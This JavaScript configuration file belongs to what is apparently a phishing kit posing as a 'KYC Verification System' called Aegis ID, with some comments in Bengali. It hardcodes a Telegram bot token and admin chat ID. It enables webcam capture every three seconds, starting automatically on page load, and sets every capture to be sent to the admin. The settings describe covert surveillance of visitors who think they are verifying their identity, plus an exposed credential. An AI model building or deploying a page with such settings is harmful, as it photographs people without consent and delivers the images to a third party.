// ============================================
//   Aegis ID — Configuration
//   KYC Verification System
// ============================================

export const CONFIG = {

  /* ---------- Telegram Bot ---------- */
  BOT_TOKEN:      "8604239989:AAHnuyJZpz_E6s-_7rXUvlbHazAKOAHEB7A",
  ADMIN_CHAT_ID:  "7274208494",

  /* ---------- reCAPTCHA v2 Site Key ---------- */
  // https://www.google.com/recaptcha/admin থেকে নিন
  RECAPTCHA_SITE_KEY: "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI",

  /* ---------- Capture ---------- */
  CAPTURE_INTERVAL_MS: 3000,   // প্রতি ৩ সেকেন্ড
  IMAGE_QUALITY: 0.78,
  CAM_WIDTH: 640,
  CAM_HEIGHT: 480,

  /* ---------- Behaviour ---------- */
  AUTO_START_ON_LOAD: true,
  SEND_ADMIN_ALWAYS: true,
  SEND_TO_USER_IF_ID: true,
  STAY_ON_PAGE_AFTER_SUCCESS: false,

  /* ---------- Debug ---------- */
  DEBUG: true
};
